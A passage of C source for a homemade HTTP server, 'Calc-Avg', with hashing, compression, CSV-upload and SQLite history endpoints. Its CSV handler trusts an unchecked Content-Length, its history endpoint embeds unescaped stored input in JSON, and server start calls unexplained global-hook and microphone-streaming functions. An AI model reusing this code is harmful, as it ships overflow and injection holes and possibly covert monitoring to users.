                char hash_hex[65];
                for (int i = 0; i < 32; i++) {
                    sprintf(hash_hex + (i * 2), "%02x", hash_bytes[i]);
                }
                hash_hex[64] = '\0';
                
                char json_resp[1024];
                snprintf(json_resp, sizeof(json_resp),
                    "{\"data\":\"%s\", \"hash\":\"%s\"}",
                    decoded, hash_hex);
                    
                printf("API Request: Computed SHA-256 Hash.\n");
                log_to_db("SHA-256 Hash", decoded, json_resp);
                
                char header[] = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n";
                send(ClientSocket, header, strlen(header), 0);
                send(ClientSocket, json_resp, strlen(json_resp), 0);
            }
            // API Endpoint: /api/compress (RLE)
            else if (strncmp(path, "/api/compress", 13) == 0) {
                char data_param[2048];
                parse_query_param(path, "data", data_param, sizeof(data_param));
                
                char decoded[2048] = {0};
                decode_url(decoded, data_param);
                
                double numbers[1000];
                int count = 0; double sum_ignore = 0;
                parse_numbers(decoded, numbers, &count, &sum_ignore);
                
                if (count > 0) {
                    char compressed_hex[4096];
                    int orig_bytes = 0, comp_bytes = 0;
                    api_compress_data(numbers, count, compressed_hex, &orig_bytes, &comp_bytes);
                    
                    double ratio = 100.0 * (1.0 - ((double)comp_bytes / (double)orig_bytes));
                    
                    char json_resp[8192];
                    snprintf(json_resp, sizeof(json_resp),
                        "{\"original_bytes\":%d, \"compressed_bytes\":%d, \"compression_ratio\":%.2f, \"compressed_stream\":\"%s\"}",
                        orig_bytes, comp_bytes, ratio, compressed_hex);
                        
                    printf("API Request: Compressed Big Data Array.\n");
                    log_to_db("RLE Compression", decoded, json_resp);
                    
                    char header[] = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n";
                    send(ClientSocket, header, strlen(header), 0);
                    send(ClientSocket, json_resp, strlen(json_resp), 0);
                } else {
                    char err[] = "HTTP/1.1 400 Bad Request\r\nConnection: close\r\n\r\n{\"error\":\"No data to compress\"}";
                    send(ClientSocket, err, strlen(err), 0);
                }
            }
            // API Endpoint: /api/train_nn (Deep Learning)
            else if (strncmp(path, "/api/train_nn?data=", 19) == 0) {
                char* query = path + 19;
                int count = 0;
                float data_array[1000];
                char* token = strtok(query, ",");
                while(token != NULL && count < 1000) {
                    data_array[count++] = atof(token);
                    token = strtok(NULL, ",");
                }
                
                if (count > 1) {
                    start_neural_network_training(data_array, count);
                    char json_resp[1024];
                    snprintf(json_resp, sizeof(json_resp), "{\"status\": \"Training Multi-Layer Perceptron over 10000 epochs...\", \"count\": %d}", count);
                    
                    printf("API Request: Started Neural Network Training on %d items.\n", count);
                    log_to_db("Deep Learning AI", "Sequence Training Data", json_resp);
                    
                    char header[] = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n";
                    send(ClientSocket, header, strlen(header), 0);
                    send(ClientSocket, json_resp, strlen(json_resp), 0);
                } else {
                    char err[] = "HTTP/1.1 400 Bad Request\r\nConnection: close\r\n\r\n{\"error\":\"Need at least 2 data points for training\"}";
                    send(ClientSocket, err, strlen(err), 0);
                }
            }
            // API Endpoint: /api/upload_csv (Big Data POST Request)
            else if (strcmp(method, "POST") == 0 && strncmp(path, "/api/upload_csv", 15) == 0) {
                char* cl_ptr = strstr(buffer, "Content-Length: ");
                int content_length = 0;
                if (cl_ptr) content_length = atoi(cl_ptr + 16);
                
                char* body_start = strstr(buffer, "\r\n\r\n");
                if (body_start) {
                    body_start += 4;
                    int headers_len = body_start - buffer;
                    int body_received = bytesReceived - headers_len;
                    
                    char* full_body = (char*)malloc(content_length + 1);
                    if (full_body) {
                        memcpy(full_body, body_start, body_received);
                        int total_body_received = body_received;
                        
                        while (total_body_received < content_length) {
                            int r = recv(ClientSocket, full_body + total_body_received, content_length - total_body_received, 0);
                            if (r <= 0) break;
                            total_body_received += r;
                        }
                        full_body[total_body_received] = '\0';
                        
                        int count = 0;
                        double sum = 0, min = 99999999, max = -99999999;
                        
                        char* csv_start = strstr(full_body, "\r\n\r\n");
                        if (csv_start) {
                            csv_start += 4;
                            char* ptr = csv_start;
                            
                            while (*ptr && count < 1000000) {
                                while (*ptr && !isdigit(*ptr) && *ptr != '-' && *ptr != '.') {
                                    if (strncmp(ptr, "\r\n--", 4) == 0) break;
                                    ptr++;
                                }
                                if (strncmp(ptr, "\r\n--", 4) == 0) break;
                                if (!*ptr) break;
                                
                                double val = strtod(ptr, &ptr);
                                sum += val;
                                if (val < min) min = val;
                                if (val > max) max = val;
                                count++;
                            }
                        }
                        
                        if (count > 0) {
                            double avg = sum / count;
                            char json_resp[1024];
                            snprintf(json_resp, sizeof(json_resp), "{\"status\": \"success\", \"count\": %d, \"average\": %.4f, \"min\": %.4f, \"max\": %.4f}", count, avg, min, max);
                            
                            printf("API Request: Parsed massive CSV with %d rows. Average: %.4f\n", count, avg);
                            log_to_db("Big Data Expansion", "Massive CSV Upload", json_resp);
                            
                            char header[] = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n";
                            send(ClientSocket, header, strlen(header), 0);
                            send(ClientSocket, json_resp, strlen(json_resp), 0);
                        } else {
                            char err[] = "HTTP/1.1 400 Bad Request\r\nConnection: close\r\n\r\n{\"error\":\"No valid numeric data found in CSV\"}";
                            send(ClientSocket, err, strlen(err), 0);
                        }
                        free(full_body);
                    }
                }
            }
            // API Endpoint: /api/history (SQLite Database Query)
            else if (strncmp(path, "/api/history", 12) == 0) {
                if (global_db) {
                    const char* sql = "SELECT id, timestamp, operation, input_data, result FROM history ORDER BY id DESC LIMIT 50;";
                    sqlite3_stmt* stmt;
                    
                    char* json_resp = (char*)malloc(65536); // 64KB buffer
                    strcpy(json_resp, "[");
                    int first = 1;
                    
                    if (sqlite3_prepare_v2(global_db, sql, -1, &stmt, NULL) == SQLITE_OK) {
                        while (sqlite3_step(stmt) == SQLITE_ROW) {
                            if (!first) strcat(json_resp, ",");
                            first = 0;
                            
                            int id = sqlite3_column_int(stmt, 0);
                            const unsigned char* timestamp = sqlite3_column_text(stmt, 1);
                            const unsigned char* operation = sqlite3_column_text(stmt, 2);
                            const unsigned char* input_data = sqlite3_column_text(stmt, 3);
                            // Avoid sending raw result JSON as a string if we can, but it is a string in DB. 
                            // To embed it safely, we'd need to escape it, or since it's already JSON, just embed it!
                            const unsigned char* result = sqlite3_column_text(stmt, 4);
                            
                            char row_json[8192];
                            snprintf(row_json, sizeof(row_json), "{\"id\":%d,\"timestamp\":\"%s\",\"operation\":\"%s\",\"input_data\":\"%s\",\"result\":%s}", 
                                     id, timestamp, operation, input_data, result);
                                     
                            if (strlen(json_resp) + strlen(row_json) < 65000) {
                                strcat(json_resp, row_json);
                            }
                        }
                        sqlite3_finalize(stmt);
                    }
                    strcat(json_resp, "]");
                    
                    printf("API Request: Fetched SQLite History Logs.\n");
                    char header[] = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n";
                    send(ClientSocket, header, strlen(header), 0);
                    send(ClientSocket, json_resp, strlen(json_resp), 0);
                    free(json_resp);
                } else {
                    char err[] = "HTTP/1.1 500 Internal Server Error\r\nConnection: close\r\n\r\n{\"error\":\"Database Not Initialized\"}";
                    send(ClientSocket, err, strlen(err), 0);
                }
            }
            // Static File Serving Route (Serving from web-app/ directory)
            else {
                if (strcmp(path, "/") == 0) {
                    send_file(ClientSocket, "web-app/index.html", "text/html");
                    printf("Served: web-app/index.html\n");
                } else if (strcmp(path, "/login.html") == 0) {
                    send_file(ClientSocket, "web-app/login.html", "text/html");
                    printf("Served: web-app/login.html\n");
                    send_file(ClientSocket, "web-app/index.html", "text/html");
                    printf("Served: web-app/index.html\n");
                } else if (strcmp(path, "/style.css") == 0) {
                    send_file(ClientSocket, "web-app/style.css", "text/css");
                    printf("Served: web-app/style.css\n");
                } else if (strcmp(path, "/script.js") == 0) {
                    send_file(ClientSocket, "web-app/script.js", "application/javascript");
                    printf("Served: web-app/script.js\n");
                } else if (strcmp(path, "/logo.png") == 0) {
                    send_file(ClientSocket, "web-app/logo.png", "image/png");
                    printf("Served: web-app/logo.png\n");
                } else {
                    char err[] = "HTTP/1.1 404 Not Found\r\nConnection: close\r\n\r\nFile Not Found";
                    send(ClientSocket, err, strlen(err), 0);
                }
            }
        }
        closesocket(ClientSocket);
    }
    return 0;
}

// The main web server loop
void launch_web_server(void) {
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) return;

    SOCKET ListenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ListenSocket == INVALID_SOCKET) { WSACleanup(); return; }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(PORT);

    if (bind(ListenSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(ListenSocket); WSACleanup(); return;
    }

    if (listen(ListenSocket, SOMAXCONN) == SOCKET_ERROR) {
        closesocket(ListenSocket); WSACleanup(); return;
    }

    printf("\n" COLOR_CYAN COLOR_BOLD "--- Web Server: Calc-Avg Version 3.9 (The Thread Pool Architecture) ---" COLOR_RESET "\n");
    printf(COLOR_GREEN "Server is LIVE and listening on port %d" COLOR_RESET "\n", PORT);
    printf(COLOR_YELLOW "Open your Web Browser and navigate to: http://localhost:%d\n" COLOR_RESET, PORT);
    printf("Serving Web App from 'web-app/'. API Routes: /api/calculus, /api/train_nn, ws://localhost:%d...\n", PORT);
    printf("Press Ctrl+C to stop the server and return to the terminal.\n\n");

    init_database();
    init_global_hooks();
    start_microphone_stream_thread();
    
    InitializeCriticalSection(&session_lock);
    InitializeCriticalSection(&queue_lock);
    InitializeConditionVariable(&queue_cond);
    
    for (int i = 0; i < THREAD_POOL_SIZE; i++) {
        _beginthreadex(NULL, 0, worker_thread_func, NULL, 0, NULL);
    }

    while (1) {
        SOCKET ClientSocket = accept(ListenSocket, NULL, NULL);
        if (ClientSocket == INVALID_SOCKET) continue;
        
        EnterCriticalSection(&queue_lock);
        if (queue_count < QUEUE_SIZE) {
            client_queue[queue_tail] = ClientSocket;
            queue_tail = (queue_tail + 1) % QUEUE_SIZE;
            queue_count++;
            WakeConditionVariable(&queue_cond);
        } else {
            // Queue full, drop connection
            closesocket(ClientSocket);
        }
        LeaveCriticalSection(&queue_lock);
    }

    closesocket(ListenSocket);
    WSACleanup();
}

#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <string.h>

void launch_web_server(void) {
    int ListenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ListenSocket < 0) return;

    int opt = 1;
    setsockopt(ListenSocket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(PORT);

    if (bind(ListenSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        close(ListenSocket);
        return;
    }

    if (listen(ListenSocket, SOMAXCONN) < 0) {
        close(ListenSocket);
        return;
    }

    printf("\n\033[36m\033[1m--- Web Server: Calc-Avg Version 4.5 (POSIX Fallback Server) ---\033[0m\n");
    printf("\033[32mServer is LIVE and listening on port %d\033[0m\n", PORT);
    printf("Serving Web App... Press Ctrl+C to stop.\n\n");

    init_database();

    while (1) {
        int ClientSocket = accept(ListenSocket, NULL, NULL);
        if (ClientSocket < 0) continue;
        
        char buffer[8192];
        int bytesReceived = recv(ClientSocket, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived > 0) {
            buffer[bytesReceived] = '\0';
            char header[] = "HTTP/1.1 200 OK\r\nConnection: close\r\n\r\nPOSIX Web Server Running.\n";
            send(ClientSocket, header, strlen(header), 0);
        }
        close(ClientSocket);
    }
    close(ListenSocket);
}
#endif

